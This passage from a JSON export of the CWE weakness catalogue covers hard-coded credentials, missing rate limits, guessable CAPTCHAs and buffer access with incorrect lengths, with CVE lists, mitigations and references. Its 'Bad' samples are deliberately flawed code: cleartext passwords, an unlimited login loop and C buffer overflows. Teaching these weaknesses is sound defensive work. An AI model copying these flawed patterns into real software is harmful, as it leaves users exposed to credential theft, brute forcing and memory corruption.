              "BodyText": "This Java example shows a properties file with a cleartext username / password pair."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n```\n# Java Web App ResourceBundle properties file* \n\t...\n\twebapp.ldap.username=secretUsername\n\twebapp.ldap.password=secretPassword\n\t..."
            },
            {
              "BodyText": "The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext."
            },
            {
              "Nature": "Bad",
              "Language": "ASP.NET",
              "ExampleCode": "```\n\t...\n\t<connectionStrings>\n\t\t<add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;\" providerName=\"System.Data.Odbc\" />\n\t</connectionStrings>\n\t...\n```"
            },
            {
              "BodyText": "Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information."
            }
          ]
        },
        {
          "ID": "DX-153",
          "Entries": [
            {
              "IntroText": "In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were \"insecure by design\" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications."
            },
            {
              "BodyText": "Multiple vendors used hard-coded credentials in their OT products."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-29953",
          "Description": "Condition Monitor firmware has a maintenance interface with hard-coded credentials",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-29953"
        },
        {
          "Reference": "CVE-2022-29960",
          "Description": "Engineering Workstation uses hard-coded cryptographic keys that could allow for unathorized filesystem access and privilege escalation",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-29960"
        },
        {
          "Reference": "CVE-2022-29964",
          "Description": "Distributed Control System (DCS) has hard-coded passwords for local shell access",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-29964"
        },
        {
          "Reference": "CVE-2022-30997",
          "Description": "Programmable Logic Controller (PLC) has a maintenance service that uses undocumented, hard-coded credentials",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-30997"
        },
        {
          "Reference": "CVE-2022-30314",
          "Description": "Firmware for a Safety Instrumented System (SIS) has hard-coded credentials for access to boot configuration",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-30314"
        },
        {
          "Reference": "CVE-2022-30271",
          "Description": "Remote Terminal Unit (RTU) uses a hard-coded SSH private key that is likely to be used in typical deployments",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-30271"
        },
        {
          "Reference": "CVE-2021-37555",
          "Description": "Telnet service for IoT feeder for dogs and cats has hard-coded password [REF-1288]",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-37555"
        },
        {
          "Reference": "CVE-2021-35033",
          "Description": "Firmware for a WiFi router uses a hard-coded password for a BusyBox shell, allowing bypass of authentication through the UART port",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-35033"
        },
        {
          "Reference": "CVE-2012-3503",
          "Description": "Installation script has a hard-coded secret token value, allowing attackers to bypass authentication",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-3503"
        },
        {
          "Reference": "CVE-2010-2772",
          "Description": "SCADA system uses a hard-coded password to protect back-end database containing authorization information, exploited by Stuxnet worm",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2772"
        },
        {
          "Reference": "CVE-2010-2073",
          "Description": "FTP server library uses hard-coded usernames and passwords for three default accounts",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2073"
        },
        {
          "Reference": "CVE-2010-1573",
          "Description": "Chain: Router firmware uses hard-coded username and password for access to debug functionality, which can be used to execute arbitrary code",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-1573"
        },
        {
          "Reference": "CVE-2008-2369",
          "Description": "Server uses hard-coded authentication key",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-2369"
        },
        {
          "Reference": "CVE-2008-0961",
          "Description": "Backup product uses hard-coded username and password, allowing attackers to bypass authentication via the RPC interface",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0961"
        },
        {
          "Reference": "CVE-2008-1160",
          "Description": "Security appliance uses hard-coded password allowing attackers to gain root access",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-1160"
        },
        {
          "Reference": "CVE-2006-7142",
          "Description": "Drive encryption product stores hard-coded cryptographic keys for encrypted configuration files in executable programs",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-7142"
        },
        {
          "Reference": "CVE-2005-3716",
          "Description": "VoIP product uses hard-coded public credentials that cannot be changed, which allows attackers to obtain sensitive information",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3716"
        },
        {
          "Reference": "CVE-2005-3803",
          "Description": "VoIP product uses hard coded public and private SNMP community strings that cannot be changed, which allows remote attackers to obtain sensitive information",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3803"
        },
        {
          "Reference": "CVE-2005-0496",
          "Description": "Backup product contains hard-coded credentials that effectively serve as a back door, which allows remote attackers to access the file system",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0496"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "MSC03-J",
          "EntryName": "Never hard code sensitive information"
        },
        {
          "TaxonomyName": "OMG ASCSM",
          "EntryID": "ASCSM-CWE-798"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 3-3",
          "EntryName": "Req SR 1.5"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-2",
          "EntryName": "Req CR 1.5"
        }
      ],
      "RelatedAttackPatterns": [
        "191",
        "70"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-7",
          "Section": "Chapter 8, \"Key Management Issues\" Page 272",
          "Authors": [
            "Michael Howard",
            "David LeBlanc"
          ],
          "Title": "Writing Secure Code",
          "Edition": "2nd Edition",
          "PublicationYear": "2002",
          "PublicationMonth": "12",
          "PublicationDay": "04",
          "Publisher": "Microsoft Press",
          "URL": "https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223"
        },
        {
          "ExternalReferenceID": "REF-729",
          "Authors": [
            "Johannes Ullrich"
          ],
          "Title": "Top 25 Series - Rank 11 - Hardcoded Credentials",
          "PublicationYear": "2010",
          "PublicationMonth": "03",
          "PublicationDay": "10",
          "Publisher": "SANS Software Security Institute",
          "URL": "https://www.sans.org/blog/top-25-series-rank-11-hardcoded-credentials/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-172",
          "Authors": [
            "Chris Wysopal"
          ],
          "Title": "Mobile App Top 10 List",
          "PublicationYear": "2010",
          "PublicationMonth": "12",
          "PublicationDay": "13",
          "URL": "https://www.veracode.com/blog/2010/12/mobile-app-top-10-list",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-962",
          "Section": "ASCSM-CWE-798",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Security Measure (ASCSM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCSM/1.0/"
        },
        {
          "ExternalReferenceID": "REF-1283",
          "Authors": [
            "Forescout Vedere Labs"
          ],
          "Title": "OT:ICEFALL: The legacy of \"insecure by design\" and its implications for certifications and risk management",
          "PublicationYear": "2022",
          "PublicationMonth": "06",
          "PublicationDay": "20",
          "URL": "https://www.forescout.com/resources/ot-icefall-report/"
        },
        {
          "ExternalReferenceID": "REF-1288",
          "Authors": [
            "Julia Lokrantz"
          ],
          "Title": "Ethical hacking of a Smart Automatic Feed Dispenser",
          "PublicationYear": "2021",
          "PublicationMonth": "06",
          "PublicationDay": "07",
          "URL": "http://kth.diva-portal.org/smash/get/diva2:1561552/FULLTEXT01.pdf"
        },
        {
          "ExternalReferenceID": "REF-1304",
          "Authors": [
            "ICS-CERT"
          ],
          "Title": "ICS Alert (ICS-ALERT-13-164-01): Medical Devices Hard-Coded Passwords",
          "PublicationYear": "2013",
          "PublicationMonth": "06",
          "PublicationDay": "13",
          "URL": "https://www.cisa.gov/news-events/ics-alerts/ics-alert-13-164-01",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the \"Mapping CWE to 62443\" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions."
        }
      ]
    },
    {
      "ID": "799",
      "Name": "Improper Control of Interaction Frequency",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not properly limit the number or frequency of interactions that it has with an actor, such as the number of incoming requests.",
      "ExtendedDescription": "This can allow the actor to perform actions more frequently than expected. The actor could be a human or an automated process such as a virus or bot. This could be used to cause a denial of service, compromise program logic (such as limiting humans to a single vote), or other consequences. For example, an authentication routine might not limit the number of times an attacker can guess a password. Or, a web site might conduct a poll but only expect humans to vote a maximum of once a day.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "691",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Insufficient anti-automation",
          "Description": "The term \"insufficient anti-automation\" focuses primarly on non-human actors such as viruses or bots, but the scope of this CWE entry is broader."
        },
        {
          "Term": "Brute force",
          "Description": "Vulnerabilities that can be targeted using brute force attacks are often symptomatic of this weakness."
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability",
            "Access Control",
            "Other"
          ],
          "Impact": [
            "DoS: Resource Consumption (Other)",
            "Bypass Protection Mechanism",
            "Other"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In the following code a username and password is read from a socket and an attempt is made to authenticate the username and password. The code will continuously checked the socket for a username and password until it has been authenticated."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar username[USERNAME_SIZE];\n\tchar password[PASSWORD_SIZE];\n\twhile (isValidUser == 0) {\n\t\t\tif (getNextMessage(socket, username, USERNAME_SIZE) > 0) {\n\t\t\t\tif (getNextMessage(socket, password, PASSWORD_SIZE) > 0) {\n\t\t\t\t\tisValidUser = AuthenticateUser(username, password);\n\t\t\t\t}\n\t\t\t}\n\t}\n\treturn(SUCCESS);\n```"
            },
            {
              "BodyText": "This code does not place any restriction on the number of authentication attempts made. There should be a limit on the number of authentication attempts made to prevent brute force attacks as in the following example code."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\tint count = 0;\n\twhile ((isValidUser == 0) && (count < MAX_ATTEMPTS)) {\n\t\t\tif (getNextMessage(socket, username, USERNAME_SIZE) > 0) {\n\t\t\t\tif (getNextMessage(socket, password, PASSWORD_SIZE) > 0) {\n\t\t\t\t\tisValidUser = AuthenticateUser(username, password);\n\t\t\t\t}\n\t\t\t}\n\t\t\tcount++;\n\t}\n\tif (isValidUser) {\n\t\treturn(SUCCESS);\n\t}\n\telse {\n\t\treturn(FAIL);\n\t}\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2002-1876",
          "Description": "Mail server allows attackers to prevent other users from accessing mail by sending large number of rapid requests.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1876"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "WASC",
          "EntryID": "21",
          "EntryName": "Insufficient Anti-Automation"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-731",
          "Authors": [
            "Web Application Security Consortium"
          ],
          "Title": "Insufficient Anti-automation",
          "URL": "http://projects.webappsec.org/Insufficient+Anti-automation"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "804",
      "Name": "Guessable CAPTCHA",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses a CAPTCHA challenge, but the challenge can be guessed or automatically recognized by a non-human actor.",
      "ExtendedDescription": "\n\nAn automated attacker could bypass the intended protection of the CAPTCHA challenge and perform actions at a higher frequency than humanly possible, such as launching spam attacks.\n\n\nThere can be several different causes of a guessable CAPTCHA:\n\n\n  - An audio or visual image that does not have sufficient distortion from the unobfuscated source image.\n\n  - A question is generated with a format that can be automatically recognized, such as a math question.\n\n  - A question for which the number of possible answers is limited, such as birth years or favorite sports teams.\n\n  - A general-knowledge or trivia question for which the answer can be accessed using a data base, such as country capitals or popular entertainers.\n\n  - Other data associated with the CAPTCHA may provide hints about its contents, such as an image whose filename contains the word that is used in the CAPTCHA.\n\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "863",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "1390",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Name": "Web Server",
          "Prevalence": "Sometimes"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control",
            "Other"
          ],
          "Impact": [
            "Bypass Protection Mechanism",
            "Other"
          ],
          "Note": "When authorization, authentication, or another protection mechanism relies on CAPTCHA entities to ensure that only human actors can access certain functionality, then an automated attacker such as a bot may access the restricted functionality by guessing the CAPTCHA."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-4036",
          "Description": "Chain: appointment booking app uses a weak hash (CWE-328) for generating a CAPTCHA, making it guessable (CWE-804)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-4036"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "WASC",
          "EntryID": "21",
          "EntryName": "Insufficient Anti-Automation"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-731",
          "Authors": [
            "Web Application Security Consortium"
          ],
          "Title": "Insufficient Anti-automation",
          "URL": "http://projects.webappsec.org/Insufficient+Anti-automation"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "805",
      "Name": "Buffer Access with Incorrect Length Value",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses a sequential operation to read or write a buffer, but it uses an incorrect length value that causes it to access memory that is outside of the bounds of the buffer.",
      "ExtendedDescription": "When the length value exceeds the size of the destination, a buffer overflow could occur.",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Resultant"
        },
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Often"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Often"
        },
        {
          "Type": "Language",
          "Class": "Assembly",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Read Memory",
            "Modify Memory",
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program's implicit security policy. This can often be used to subvert any other security service."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "Modify Memory",
            "DoS: Crash, Exit, or Restart",
            "DoS: Resource Consumption (CPU)"
          ],
          "Note": "Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-1",
          "Method": "Automated Static Analysis",
          "Description": "\n\nThis weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.\n\n\nAutomated static analysis generally does not account for environmental considerations when reporting out-of-bounds memory operations. This can make it difficult for users to determine which warnings should be investigated first. For example, an analysis tool might report buffer overflows that originate from command line arguments in a program that is not expected to run with setuid or other special privileges.\n",
          "Effectiveness": "High",
          "EffectivenessNotes": "Detection techniques for buffer-related errors are more mature than for most other weakness types."
        },
        {
          "DetectionMethodID": "DM-2",
          "Method": "Automated Dynamic Analysis",
          "Description": "This weakness can be detected using dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.",
          "Effectiveness": "Moderate",
          "EffectivenessNotes": "Without visibility into the code, black box methods may not be able to sufficiently distinguish this weakness from others, requiring manual methods to diagnose the underlying problem."
        },
        {
          "DetectionMethodID": "DM-9",
          "Method": "Manual Analysis",
          "Description": "Manual analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. This becomes difficult for weaknesses that must be considered for all inputs, since the attack surface can be too large."
        }
      ],
      "PotentialMitigations": [
        {
          "MitigationID": "MIT-3",
          "Phase": [
            "Requirements"
          ],
          "Strategy": "Language Selection",
          "Description": "\n\nUse a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nFor example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer.\n\n\nBe wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe.\n"
        },
        {
          "MitigationID": "MIT-4.1",
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Libraries or Frameworks",
          "Description": "\n\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nExamples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions.\n",
          "EffectivenessNotes": "This is not a complete solution, since many buffer overflows are not related to strings."
        },
        {
          "MitigationID": "MIT-10",
          "Phase": [
            "Operation",
            "Build and Compilation"
          ],
          "Strategy": "Environment Hardening",
          "Description": "\n\nUse automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking. \n\n\n D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail. \n",
          "Effectiveness": "Defense in Depth",
          "EffectivenessNotes": "\n\n This is not necessarily a complete solution, since these mechanisms only detect certain types of overflows. In addition, the result is still a denial of service, since the typical response is to exit the application. \n"
        },
        {
          "MitigationID": "MIT-9",
          "Phase": [
            "Implementation"
          ],
          "Description": "\n\nConsider adhering to the following rules when allocating and managing an application's memory:\n\n\n  - Double check that the buffer is as large as specified.\n\n  - When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string.\n\n  - Check buffer boundaries if accessing the buffer in a loop and make sure there is no danger of writing past the allocated space.\n\n  - If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.\n\n"
        },
        {
          "MitigationID": "MIT-15",
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."
        },
        {
          "MitigationID": "MIT-11",
          "Phase": [
            "Operation",
            "Build and Compilation"
          ],
          "Strategy": "Environment Hardening",
          "Description": "\n\nRun or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code. \n\n\n Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as \"rebasing\" (for Windows) and \"prelinking\" (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking. \n\n\n For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335]. \n",
          "Effectiveness": "Defense in Depth",
          "EffectivenessNotes": "These techniques do not provide a complete solution. For instance, exploits frequently use a bug that discloses memory addresses in order to maximize reliability of code execution [REF-1337]. It has also been shown that a side-channel attack can bypass ASLR [REF-1333]."
        },
        {
          "MitigationID": "MIT-12",
          "Phase": [
            "Operation"
          ],
          "Strategy": "Environment Hardening",
          "Description": "\n\n Use a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment. \n\n\n For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336]. \n",
          "Effectiveness": "Defense in Depth",
          "EffectivenessNotes": "This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application."
        },
        {
          "MitigationID": "MIT-17",
          "Phase": [
            "Architecture and Design",
            "Operation"
          ],
          "Strategy": "Environment Hardening",
          "Description": "Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the product or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."
        },
        {
          "MitigationID": "MIT-22",
          "Phase": [
            "Architecture and Design",
            "Operation"
          ],
          "Strategy": "Sandbox or Jail",
          "Description": "\n\nRun the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.\n\n\nOS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.\n\n\nThis may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.\n\n\nBe careful to avoid CWE-243 and other weaknesses related to jails.\n",
          "Effectiveness": "Limited",
          "EffectivenessNotes": "The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-1",
          "Entries": [
            {
              "IntroText": "This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid host_lookup(char *user_supplied_addr){\n\t\t\tstruct hostent *hp;\n\t\t\tin_addr_t *addr;\n\t\t\tchar hostname[64];\n\t\t\tin_addr_t inet_addr(const char *cp);\n```\n/*routine that ensures user_supplied_addr is in the right format for conversion */* \n\t\t\t\n\t\t\tvalidate_addr_form(user_supplied_addr);\n\t\t\taddr = inet_addr(user_supplied_addr);\n\t\t\thp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);\n\t\t\tstrcpy(hostname, hp->h_name);}"
            },
            {
              "BodyText": "This function allocates a buffer of 64 bytes to store the hostname under the assumption that the maximum length value of hostname is 64 bytes, however there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then the function may overwrite sensitive data or even relinquish control flow to the attacker."
            },
            {
              "BodyText": "Note that this example also contains an unchecked return value (CWE-252) that can lead to a NULL pointer dereference (CWE-476)."
            }
          ]
        },
        {
          "ID": "DX-114",
          "Entries": [
            {
              "IntroText": "In the following example, it is possible to request that memcpy move a much larger segment of memory than assumed:"
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint returnChunkSize(void *) {\n```\n/* if chunk info is valid, return the size of usable memory,* \n\t\t\t\n\t\t\t\n\t\t\t ** else, return -1 to indicate an error* \n\t\t\t\n\t\t\t\n\t\t\t **/* \n\t\t\t...}\n\tint main() {\n\t```\n\t\t...\n\t\tmemcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1));\n\t\t...\n\t}\n```"
            },
            {
              "BodyText": "If returnChunkSize() happens to encounter an error it will return -1. Notice that the return value is not checked before the memcpy operation (CWE-252), so -1 can be passed as the size argument to memcpy() (CWE-805). Because memcpy() assumes that the value is unsigned, it will be interpreted as MAXINT-1 (CWE-195), and therefore will copy far more memory than is likely available to the destination buffer (CWE-787, CWE-788)."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the following example, the source character string is copied to the dest character string using the method strncpy."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t...\n\tchar source[21] = \"the character string\";\n\tchar dest[12];\n\tstrncpy(dest, source, sizeof(source)-1);\n\t...\n```"
            },
            {
              "BodyText": "However, in the call to strncpy the source character string is used within the sizeof call to determine the number of characters to copy. This will create a buffer overflow as the size of the source character string is greater than the dest character string. The dest character string should be used within the sizeof call to ensure that the correct number of characters are copied, as shown below."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\t...\n\tchar source[21] = \"the character string\";\n\tchar dest[12];\n\tstrncpy(dest, source, sizeof(dest)-1);\n\t...\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In this example, the method outputFilenameToLog outputs a filename to a log file. The method arguments include a pointer to a character string containing the file name and an integer for the number of characters in the string. The filename is copied to a buffer where the buffer size is set to a maximum size for inputs to the log file. The method then calls another method to save the contents of the buffer to the log file."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t#define LOG_INPUT_SIZE 40\n```\n// saves the file name to a log file* \n\tint outputFilenameToLog(char *filename, int length) {\n\t```\n\t\t\tint success;\n```\n// buffer with size set to maximum size for input to log file* \n\t\t\tchar buf[LOG_INPUT_SIZE];\n\t\t\t\n\t\t\t\n\t\t\t *// copy filename to buffer* \n\t\t\tstrncpy(buf, filename, length);\n\t\t\t\n\t\t\t\n\t\t\t *// save to log file* \n\t\t\tsuccess = saveToLogFile(buf);\n\t\t\t\n\t\t\treturn success;}"
            },
            {
              "BodyText": "However, in this case the string copy method, strncpy, mistakenly uses the length method argument to determine the number of characters to copy rather than using the size of the local character string, buf. This can lead to a buffer overflow if the number of characters contained in character string pointed to by filename is larger then the number of characters allowed for the local character string. The string copy method should use the buf character string within a sizeof call to ensure that only characters up to the size of the buf array are copied to avoid a buffer overflow, as shown below."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\t...\n```\n// copy filename to buffer* \n\tstrncpy(buf, filename, sizeof(buf)-1);\n\t..."
            }
          ]
        },
        {
          "ID": "DX-189",
          "Entries": [
            {
              "IntroText": "Windows provides the MultiByteToWideChar(), WideCharToMultiByte(), UnicodeToBytes(), and BytesToUnicode() functions to convert between arbitrary multibyte (usually ANSI) character strings and Unicode (wide character) strings. The size arguments to these functions are specified in different units, (one in bytes, the other in characters) making their use prone to error."
            },
            {
              "BodyText": "In a multibyte character string, each character occupies a varying number of bytes, and therefore the size of such strings is most easily specified as a total number of bytes. In Unicode, however, characters are always a fixed size, and string lengths are typically given by the number of characters they contain. Mistakenly specifying the wrong units in a size argument can lead to a buffer overflow."
            },
            {
              "BodyText": "The following function takes a username specified as a multibyte string and a pointer to a structure for user information and populates the structure with information about the specified user. Since Windows authentication uses Unicode for usernames, the username argument is first converted from a multibyte string to a Unicode string."
            },
            {
              "Nature": "Bad",
              "Language": "C",
